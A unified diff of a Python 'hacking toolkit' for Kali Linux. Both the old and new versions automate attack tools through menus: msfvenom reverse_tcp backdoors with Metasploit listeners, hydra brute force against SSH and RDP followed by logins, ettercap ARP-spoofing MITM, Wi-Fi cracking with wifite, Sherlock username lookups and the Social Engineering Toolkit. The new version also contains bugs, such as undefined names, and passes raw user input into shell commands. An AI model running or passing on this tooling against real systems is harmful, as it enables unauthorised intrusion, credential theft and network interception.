@@ -1,545 +1,252 @@
-import time
+import subprocess
 import os
-import platform
+import time
 import pyautogui
+import sys
 
-os_type = platform.system()
+def slow_print(text, delay=0.1):
+    for char in text + '\n':
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
 
-print('* WARNING: THIS PROGRAM WILL WORK WITHOUT ERRORS ON KALI LINUX XFCE, NOT ON GNOME *')
-print('Author: Muhammed, Peygamov')
-print('''\033[91m
-      ),\                                                           /,( 
-       /__'.                                                      .'/__
-        `)   `'-. \                                             / .-'`   ('
-        /   _.--'\ '.          ,               ,          .' /'--._     |
-        \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /
-         `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`
-           )-'`        .'   :||  / -.\ //.- \  ||:   '.        `'-(
-          /          .'    / \_ |  /●`^'●\  | _// \    '.        )
-           `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('
-           /_.'     .-'  _.-'     \ \/^\/ //     `-._  '-.     '.
-            '-._' /`            _   \-.-//   _            `\ '_.-'
-                `<     _,..--''`|    \`"`/    |`''--..,_     >`
-                 _\  ``--..__   \     `'`     /   __..--``  /_
-                /  '-.__     ``'-;    / \    ;-'``     __.-'
-                '-._    '-._  /    |---|---|    \  _.-'    _.-'
-                     `'-._   '/ / / /---|---\ \ \ '   _.-'` 
-                             `)` `  /'---'\  ` `(`               
-                      /_____/|  / \._\   /_./ \  |\_____                                                               
-                                   Version: 3.0
-           ''')
-print()
-
-def print_colored(text, color_code):
-    print("\033[{}m{}\033[0m".format(color_code, text))
+def print_red(text):
+    red_text = "\033[91m" + text + "\033[0m"
+    print(red_text)
 
 def print_green(text):
-    print("\033[92m{}\033[0m".format(text))
+    green_text = "\033[92m" + text + "\033[0m"
+    print(green_text)
 
-def telegram_bot():    # menu of options & commands.
-    try:
-        while True:
-            if os_type == 'Linux':
-                current_directory = os.getcwd()
-                prompt = f"\033[91m┌──(w34p0n㉿r00t)-[null]\n└─# \033[0m"
-                print(prompt, end='', flush=True)  # Print the prompt without newline
-                menu = input()
+def skull():
+    print("\n" * 5)  
+    print("                           .          . ")
+    print("                          /            \\      ")
+    print("                         |,  .-.  .-.  ,|      ")
+    print("                         | )(_ /  \\_ )( |")
+    print("                         |/     /\\     \\|    ")
+    print("\033[91m        (@_      <__    ^^    __>        ")
+    print("          _       \\_______\\__|IIIIII|__/_____________________ ")
+    print("          (_)\\@8@8{}<________________________________________> ")
+    print("                  )_/       \\ IIIIII /                    ")
+    print("                (@           --------                      ")
+    print("\033[96m                                               ")
+    print("\033[91m                           Version: 1.0                              ")
+    print("\n" * 3) 
 
-                if menu == 'help':
-                    help_menu()
-                elif menu == 'exit' or menu == 'quit':
-                    print('Exiting...')
-                    time.sleep(1)
-                    exit()
-                elif menu == 'clear':
-                    os.system('clear')
-                    menu_logo()
-                elif menu == 'start':
-                    start_menu()
-                    current_directory = os.getcwd()
-                    prompt = f"\033[91m┌──(w34p0n㉿r00t)-[null]\n└─# \033[0m"
-                    print(prompt, end='', flush=True)
-                    menu = input()
+def menu():
+    print_green('              [01]   Nmap Aggressive Network Scan.')
+    print_green('              [02]   Create MSFVenom Payload.')
+    print_green('              [03]   SSH Brute Force Attack (Linux).')
+    print_green('              [04]   Gather Info With Sherlock.')
+    print_green('              [05]   Launch Wifite.')
+    print_green('              [06]   Perform Nmap OS Detection on The Network.')
+    print_green('              [07]   RDP Brute Force Attack (Windows Login Page)')
+    print_green('              [08]   Launch Social Engineering ToolKit [SET]')
 
-                    if menu == '1' or menu == '01':
-                        pyautogui.hotkey('ctrl', 'alt', 't')
-                        time.sleep(1)
-                        pyautogui.write('msfconsole')
-                        pyautogui.press('enter')
-                    elif menu == 'clear':
-                        os.system('clear')
-                        menu_logo()
-                    elif menu == '2':
-                        pyautogui.hotkey('ctrl', 'alt', 't')
-                        time.sleep(0.80)
-                        pyautogui.write('sudo apt install arp-scan -y')
-                        pyautogui.press('enter')
-                        time.sleep(4)
-                        pyautogui.write('sudo arp-scan --localnet')
-                        pyautogui.press('enter')
-                    elif menu == '3':
-                        start_msvenom_payload()
-                    elif menu == '4':
-                        system_clean_up()
-                        print('Go to the 3rd column and select all and start cleaning up')
-                    elif menu == '5':
-                        os_detection()
-                    elif menu == '6':
-                        nmap_aggressive_windows_attack()
-                    elif menu == '7':
-                        mitm_attack()
-                    elif menu == '8':
-                        wifite_attack()
-                    elif menu == '9':
-                        sherlock_information_gathering()
-                    elif menu == '10':
-                        nmap_aggresive_attack_to_network()
-                    elif menu == '11':
-                        aggressive_website_scan()
-                    elif menu == '12':
-                        ssh_brute_force_attack()
-                    elif menu == '13':
-                        rdp_brute_force_attack()
-                    elif menu == '19':
-                        cleanup()
-                    elif menu == '20':
-                        print('Exiting...')
-                        time.sleep(0.80)
-                        exit()
-                else:
-                    print('Type "help" for help')
-            elif os_type == 'Windows':
-                print('[!] This Version of Program is Not Supported on Windows! Try run it on Linux.')
-    except KeyboardInterrupt:
-        print("Keyboard interrupt detected! Exiting...")
+def intro():
+    slow_print('Installing & Checking Requirements...')
+    slow_print('Remember kids, hacking is illegal')
+    time.sleep(1)
 
-def start_menu():
-    print_skull()
-    print()
-    print('MENU OF OPTIONS:')
-    print()
-    print_green('      [01]  Jump to MSFConsole (Metasploit-Framework)')
-    print_green('      [02]  Display Connected Clients On The Network')
-    print_green('      [03]  Create Backdoor MSFVenom [Detectable]')
-    print_green('      [04]  Clean Up Your System')
-    print_green('      [05]  Detect Nmap OS Detection')
-    print_green('      [06]  Launch Nmap Aggressive Attack (Windows Attack)')
-    print_green('      [07]  Perform MiTM Attack')
-    print_green('      [08]  Launch Wifite')
-    print_green('      [09]  Gather User Information With Sherlock')
-    print_green('      [10]  Start Aggressive Nmap Attack To Network')
-    print_green('      [11]  Aggressive Website Scan Using Nmap')
-    print_green('      [12]  SSH Brute Force Attack [Linux]')
-    print_green('      [13]  RDP Brute Force Attack [Windows]')
-    print_green('      [19]  Cleanup')
-    print_green('      [20]  Exit')
-    print()
+    cmd = subprocess.run(['sudo', 'apt', 'update', '-y'])
+    if cmd.returncode != 0:
+        print('Failed to update. Please check your internet connection and try again.')
 
-def rdp_brute_force_attack():
-    rdp_ip = input('Enter rdp [Windows] IP: ')
+    cmd = subprocess.run(['sudo', 'apt', 'upgrade', '-y'])
+    if cmd.returncode != 0:
+        print('Failed to upgrade. Please check your internet connection and try again.')
 
-    rdp_wordlist_password = input('Enter Wordlist For Passwords: ')
-    rdp_wordlist_username = input('Enter Wordlist For Username: ')
-    rdp_hydra_question = input('Do you have hydra installed? (yes/no): ')
 
-    if rdp_hydra_question == 'yes':
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
+    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'nmap'])
+    if cmd.returncode != 0:
+        print_red("Failed to install Nmap. Please check your internet connection and try again.")
+        exit()
 
-        pyautogui.write(f'hydra -V -P {rdp_wordlist_password} -L {rdp_wordlist_username} {rdp_ip} rdp')
-        pyautogui.press('enter')
-    else:
-        ask_for_installation_hydra_rdp = input('Do you wanna install hydra now? (yes/no): ')
+    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'metasploit-framework'])
+    if cmd.returncode != 0:
+        print_red("Failed to install Metasploit Framework. Please check your internet connection and try again.")
+        exit()
 
-        if ask_for_installation_hydra_rdp == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.90)
+    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'hydra'])
+    if cmd.returncode != 0:
+        print_red('Failed To Install Hydra. Please check your internet connection and try again.')
+        exit()
 
-            pyautogui.write('sudo apt install hydra -y')
-            pyautogui.press('enter')
+    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'sherlock'])
+    if cmd.returncode != 0:
+        print_red('Failed to install Sherlock. Please check your internet connection and try again.')
+
+    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'wifite'])
+    if cmd.returncode != 0:
+        print_red('Failed to install Wifite. Please check your internet connection and try again.')
+
+    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'freerdp2-x11'])
+    if cmd.returncode != 0:
+        print_red('Failed To Install xfreerdp. Please check your internet connection and try again.')
+
+    cmd = subprocess.run(['sudo', 'apt', 'install', '-y', 'set'])
+    if cmd.returncode != 0:
+        print_red('Failed to install set. Please check your internet connection and try again.')
+
+    os.system('clear')
+
+    while True:
+        skull()
+        menu()
+        print()
+        print()
+        shell = input('\033[91mroot@kali:\033[0m\033[94mbhtoolkit~#\033[0m ')
+
+        if shell == '1':
+            nmap_aggressive_network_scan()
+        elif shell == '2':
+            msfvenom_payload_create()
+        elif shell == '3':
+            ssh_bruteforce_attack()
+        elif shell == '4':
+            information_gathering()
+        elif shell == '5':
+            wifite()
+        elif shell == '6':
+            os_detection_nmap()
+        elif shell == '7':
+            rdp_loginpage()
+        elif shell == '8':
+            set()
+        elif shell == 'clear':
+            os.system('clear')
         else:
+            print_red(f'[-] Unknown command --> {shell}. Try Again!')
             exit()
 
-def ssh_brute_force_attack():
-    ssh_ip = input('Enter SSH IP: ')
+def set():
+    pyautogui.hotkey('ctrl', 'shift', 't')
+    time.sleep(1)
+    pyautogui.write('sudo setoolkit')
+    pyautogui.press('enter')
 
-    ssh_wordlist_password = input('Enter Wordlist For Passwords: ')
-    ssh_wordlist_username = input('Enter Wordlist For Username: ')
-    ssh_hydra_question = input('Do you have hydra installed? (yes/no): ')
+def rdp_loginpage():
+    user_rdp = input('Enter Windows Username to Brute Force: ')
+    localhost = input('Enter Localhost: ')
+    wordlist_rdp = input('Enter Wordlist: ')
+    cmd = os.system(f'hydra -V -l {user_rdp} -P {wordlist_rdp} {localhost} rdp')
 
+    if cmd != 0:
+        print_red('Error Occured during brute force.')
+        exit()
 
-    if ssh_hydra_question == 'yes':
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
+    rdp_user_ask = input('Wanna Connect To Desktop Now? (yes/no): ')
+    rdp_username = input('Enter username of target: ')
 
-        pyautogui.write(f'hydra -V -P {ssh_wordlist_password} -L {ssh_wordlist_username} {ssh_ip} ssh')
-        pyautogui.press('enter')
-    else:
-        ask_for_installation_hydra_ssh = input('Do you wanna install hydra now? (yes/no): ')
+    rdp_password = input('Enter password of target: ')
+    rdp_localhost = input('Enter localhost of target: ')
 
-        if ask_for_installation_hydra_ssh == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.90)
+    if rdp_user_ask == 'yes':
+        cmd = os.system(f'xfreerdp /v:{rdp_localhost} /u:{rdp_usernamep} /p:{rdp_username}')
 
-            pyautogui.write('sudo apt install hydra -y')
-            pyautogui.press('enter')
-        else:
+        if cmd != 0:
+            print_red('An error occured during connecting to the desktop\nError Code 404.')
             exit()
 
-def aggressive_website_scan():
-    user_ask_nmap = input('Do you have nmap installed? (yes/no): ')
-
-    if user_ask_nmap == 'yes':
-        website_scan = input('(do not type https://) Enter a website to scan : ')
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write(f'nmap -A -T4 {website_scan}')
-        pyautogui.press('enter')
-    elif user_ask_nmap == 'no':
-        user_ask_nmap_to_install = input('Install Nmap Now? (yes/no): ')
-
-        if user_ask_nmap_to_install == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.80)
-
-            pyautogui.write('sudo apt install nmap -y')
-            pyautogui.press('enter')
-        elif user_ask_nmap_to_install == 'no':
-            print('Exiting...')
-            time.sleep(0.80)
-            exit()
-
-def cleanup():
-    pyautogui.hotkey('ctrl', 'alt', 't')
-    time.sleep(0.80)
-
-    pyautogui.write('sudo apt update -y && sudo apt upgrade -y && sudo apt autoremove -y && sudo apt clean -y')
-    pyautogui.press('enter')
-
-def nmap_aggresive_attack_to_network():
-    nmap_question = input('Do you have nmap installed? (yes/no): ')
-
-    if nmap_question == 'yes':
-        nmap_target_question = input('Enter Router IP To Attack: ')
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write(f'nmap -T4 -A -v {nmap_target_question}')
-        pyautogui.press('enter')
-    elif nmap_question == 'no':
-        nmap_question_2 = input('Install Nmap Now? (yes/no): ')
-    else:
-        print('[-] Unknown Command Detected! Type "help" for help')
-
-        if nmap_question_2 == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.80)
-
-            pyautogui.write('sudo apt install nmap -y')
-            pyautogui.press('enter')
-        elif nmap_question2 == 'no':
-            print('Exiting...')
-            time.sleep(0.70)
-            exit()
-        else:
-            print('[-] Unknown Command Detected! Type "help" for help')
-
-def menu_logo():
-    print('''\033[91m
-      ),\                                                           /,( 
-       /__'.                                                      .'/__
-        `)   `'-. \                                             / .-'`   ('
-        /   _.--'\ '.          ,               ,          .' /'--._     |
-        \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /
-         `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`
-           )-'`        .'   :||  / -.\ //.- \  ||:   '.        `'-(
-          /          .'    / \_ |  /●`^'●\  | _// \    '.        )
-           `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('
-           /_.'     .-'  _.-'     \ \/^\/ //     `-._  '-.     '.
-            '-._' /`            _   \-.-//   _            `\ '_.-'
-                `<     _,..--''`|    \`"`/    |`''--..,_     >`
-                 _\  ``--..__   \     `'`     /   __..--``  /_
-                /  '-.__     ``'-;    / \    ;-'``     __.-'
-                '-._    '-._  /    |---|---|    \  _.-'    _.-'
-                     `'-._   '/ / / /---|---\ \ \ '   _.-'` 
-                             `)` `  /'---'\  ` `(`               
-                      /_____/|  / \._\   /_./ \  |\_____                                                               
-                                   Version: 3.0
-           ''')
-
-def print_skull():
-    print()
-    print("	                       .          . ")
-    print("	                      /            \      Author: Muhammed, Peygamov")
-    print("	                     |,  .-.  .-.  ,|      ")
-    print("	                     | )(_ /  \_ )( |")
-    print("	                     |/     /\     \|    ")
-    print("\033[91m	    (@_      <__    ^^    __>        ")
-    print("	      _       \_______\__|IIIIII|__/_____________________ ")
-    print("	      (_)\@8@8{}<________________________________________> ")
-    print("	              )_/       \ IIIIII /                    ")
-    print("	            (@           --------                      ")
-    print("\033[96m		                                       ")
-    print("\033[91m		               Version: 3.0                              ")
-
-    print()
-
-
-def sherlock_information_gathering():
-    pyautogui.hotkey('ctrl', 'alt', 't')
-    time.sleep(0.80)
-
-    pyautogui.write('sudo apt install sherlock -y')
-    pyautogui.press('enter')
-
-    print('Answer that Question')
-    user_sherlock_ask = input('(Note: Answer the question when sherlock installation will be completed!) Enter the Name To Get Info: ')
-    pyautogui.write(f'sherlock {user_sherlock_ask}')
-    pyautogui.press('enter')
-
-def wifite_attack():
-    user_ask_wifite = input('Do you have wifite/aircrack-ng installed? (yes/no): ')
-
-    if user_ask_wifite == 'yes':
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write('sudo wifite')
-        pyautogui.press('enter')
-    elif user_ask_wifite == 'no':
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write("sudo apt install wifite -y && sudo apt install aircrack-ng -y")
-        pyautogui.press('enter')
-    else:
-        print('[-] Unknown Command Detected! Type "help" for help')
-
-def mitm_attack():
-    pyautogui.hotkey('ctrl', 'alt', 't')
-    time.sleep(0.80)
-
-    pyautogui.write('sudo apt install ettercap-text-only -y')
-    pyautogui.press('enter')
-
-    time.sleep(2)
-    mitm_router = input('Your Router IP: ')
-    mitm_ip_target = input('Enter Target IP: ')
-
-    pyautogui.hotkey('ctrl', 'alt', 't')
-    time.sleep(0.80)
-
-    pyautogui.write(f'sudo ettercap -T -M arp:remote //{mitm_ip_target}// //{mitm_router}//')
-    pyautogui.press('enter')
-
-def nmap_aggressive_windows_attack():
-    nmap_installation_ask = input('Do you have Nmap installed? (yes/no): ')
-
-    if nmap_installation_ask == 'yes':
-        nmap_ip_windows_ask = input('Enter Windows IP For Aggressive Attack: ')
-
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write(f'nmap -A {nmap_ip_windows_ask}')
-        pyautogui.press('enter')
-    elif nmap_installation_ask == 'no':
-        nmap_ask = input('Do you want install nmap now? (yes/no): ')
-        if nmap_ask == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.80)
-
-            pyautogui.write('sudo apt install nmap -y')
-            pyautogui.press('enter')
-        elif nmap_ask == 'no':
-            print('Alright, exiting...')
-            time.sleep(1)
-            exit()
-    else:
-        print('Unknown Command Detected! Type "help" for help')
-
-
-def os_detection():
-    user_nmap_question = input('Do you have nmap installed? (yes/no): ')
-
-    if user_nmap_question == 'yes':
-        nmap_ip_ask = input('Enter Target IP: ')
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write(f'nmap {nmap_ip_ask}')
-        pyautogui.press('enter')
-        print('If nmap is running, please wait, its scanning for open ports!')
-
-    elif user_nmap_question == 'no':
-        print('Please Install Nmap To Perform OS Detection!')
+    elif rdp_user_ask == 'no':
+        print_red('Exiting...')
         time.sleep(0.50)
-        nmap_install = input('Install Nmap Now? (yes/no): ')
+        exit()
 
-        if nmap_install == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.80)
 
-            pyautogui.write('sudo apt install nmap -y')
-            pyautogui.press('enter')
+def os_detection_nmap():
+    print_red('** OS DETECTION MAY TAKE SOME TIME **')
+    ip_target = input('Enter Target IP:')
+    cmd = os.system(f'nmap -O {ip_target}')
 
-            time.sleep(1)
-            print('Now you have installed Nmap!')
+    if cmd != 0:
+        print_red('An Error Occured!')
+        exit()
+
+def wifite():
+    user_ask = input('Enter your interface: ')
+    time.sleep(0.50)
+    cmd = os.system(f'airmon-ng start {user_ask}')
+    cmd = os.system('airmon-ng check kill')
+    cmd = os.system('wifite')
+
+    if cmd != 0:
+        print_red('Error!')
+        exit()
+
+
+def information_gathering():
+    ppl = input('Enter Username Or Name To Gather: ')
+    cmd = os.system(f'sherlock {ppl}')
+
+
+def ssh_bruteforce_attack():
+    ssh = input('Enter Target: ')
+    login = input('Enter Login: ')
+    wordlist = input('Enter Wordlist: ')
+
+    cmd = os.system(f'hydra -V -l {login} -P {wordlist} {ssh} ssh')
+    if cmd != 0:
+        print_red("Error occurred during Hydra execution. Exiting...")
+        exit()
+
+    ask = input('Start Connecting Target Now? (yes/no): ')
+
+    if ask == 'yes':
+        login_crd = input('Enter Login Of The Target: ')
+        password_crd = input('Enter Password Of Target: ')
+        ip_crd = input('Enter Hostname Of Target: ')
+
+        cmd = os.system(f'ssh {login_crd}@{ip_crd}')
+        if cmd != 0:
+            print_greem("Error occurred while connecting to the target. Exiting...")
+            exit()
     else:
-        print('[-] Unknown Command Detected! Type "help" for help')
+        print('Exiting...')
+        time.sleep(0.50)
+        exit()
 
-def system_clean_up():
-    pyautogui.hotkey('ctrl', 'alt', 't')
-    time.sleep(0.90)
-
-    pyautogui.write('sudo apt install stacer')
-    pyautogui.press('enter')
-
-    time.sleep(3)
-    pyautogui.write('stacer')
-    pyautogui.press('enter')
-
-def help_menu():
-    print()
-    print("\033[92mstart\033[0m")
-    print("\033[91mquit/exit\033[0m")
-    print()
-
-def start_msvenom_payload():
-    print()
+def msfvenom_payload_create():
+    os.system('clear')
     print_green('[1] windows/meterpreter/reverse_tcp')
     print_green('[2] android/meterpreter/reverse_tcp')
-    print_green('[3] windows/meterpreter/reverse_https')
+    print_red('[3] Exit')
     print()
+    choice = input('Enter Choice: ')
+    ip = input('Enter Local Host: ')
+    port = input('Enter Local Port: ')
+    output = input('Enter Output Of The Payload (add .exe or .apk at the end): ')
 
-    payload_ask = input('Payload: ')
-    lhost_ask = input('IP: ')
-    lport_ask = input('PORT: ')
-    payload_name = input('Enter The Payload Name To Create: ')
-
-    if payload_ask == '1':
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost_ask} LPORT={lport_ask} -f exe -o {payload_name}')
-        pyautogui.press('enter')
-
-        time.sleep(2)
-        listener_ask = input('Do you wanna start listener? (yes/no): ')
-
-        if listener_ask == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.50)
-            pyautogui.write('msfconsole')
-
-            pyautogui.press('enter')
-            time.sleep(13)
-
-            time.sleep(1)
-            pyautogui.write('use exploit/multi/handler')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write('set payload windows/meterpreter/reverse_tcp')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write(f'set LHOST {lhost_ask}')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write(f'set LPORT {lport_ask}')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write('exploit')
-            pyautogui.press('enter')
-
-            print('LISTENING FOR TARGET TO OPEN .EXE FILE! DO NOT LOOK UP HERE, LOOK UP TO METASPLOIT')
-
-    elif payload_ask == '2':
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost_ask} LPORT={lport_ask} -f raw -o {payload_name}')
-        pyautogui.press('enter')
-
-        time.sleep(2)
-        listener_ask = input('Do you wanna start listener? (yes/no): ')
-
-        if listener_ask == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.50)
-            pyautogui.write('msfconsole')
-
-            pyautogui.press('enter')
-            time.sleep(13)
-
-            time.sleep(1)
-            pyautogui.write('use exploit/multi/handler')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write('set payload android/meterpreter/reverse_tcp')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write(f'set LHOST {lhost_ask}')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write(f'set LPORT {lport_ask}')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write('exploit')
-            pyautogui.press('enter')
-
-            print('LISTENING FOR TARGET TO OPEN .EXE FILE!')
-
-    elif payload_ask == '3':
-        pyautogui.hotkey('ctrl', 'alt', 't')
-        time.sleep(0.80)
-
-        pyautogui.write(f'msfvenom -p windows/meterpreter/reverse_https LHOST={lhost_ask} LPORT={lport_ask} -f exe -o {payload_name}')
-        pyautogui.press('enter')
-
-        time.sleep(2)
-        listener_ask = input('Do you wanna start listener? (yes/no): ')
-
-        if listener_ask == 'yes':
-            pyautogui.hotkey('ctrl', 'alt', 't')
-            time.sleep(0.50)
-            pyautogui.write('msfconsole')
-
-            pyautogui.press('enter')
-            time.sleep(13)
-
-            time.sleep(1)
-            pyautogui.write('use exploit/multi/handler')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write('set payload windows/meterpreter/reverse_https')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write(f'set LHOST {lhost_ask}')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write(f'set LPORT {lport_ask}')
-            pyautogui.press('enter')
-
-            time.sleep(1)
-            pyautogui.write('exploit')
-            pyautogui.press('enter')
-
-            print('LISTENING FOR TARGET TO OPEN .EXE or .APK FILE!')
-
+    if choice == '1':
+        payload_type = 'windows/meterpreter/reverse_tcp'
+    elif choice == '2':
+        payload_type = 'android/meterpreter/reverse_tcp'
+    elif choice == '3':
+        exit()
     else:
-        print('Invalid option for payload!')
+        print_red("Invalid choice.")
+        return
 
-telegram_bot()
-print_green('')
+    cmd = subprocess.run(['msfvenom', '-p', payload_type, f'LHOST={ip}', f'LPORT={port}', '-f', 'exe', '-o', output])
+    if cmd.returncode == 0:
+        print_red('** THE OUTPUT OF THE PAYLOAD IS ON THE FOLDER! **')
+        msfconsole = input('Start Listener Now? (yes/no): ')
+        if msfconsole == 'yes':
+            subprocess.run(['msfconsole', '-q', '-x', f'use exploit/multi/handler;set payload {payload_type};set LHOST {ip};set LPORT {port};exploit'])
+        else:
+            print('Exiting...')
+            time.sleep(0.10)
+            exit()
+    else:
+        print_red("Failed to create the payload.")
+        exit()
+
+def nmap_aggressive_network_scan():
+    user_ask_gateway_ip = input('Enter Gateway IP: ')
+    cmd = subprocess.run(['nmap', '-T5', user_ask_gateway_ip])
+    if cmd.returncode != 0:
+        print_red("Failed to perform Nmap scan.")
+        exit()
+
+intro()
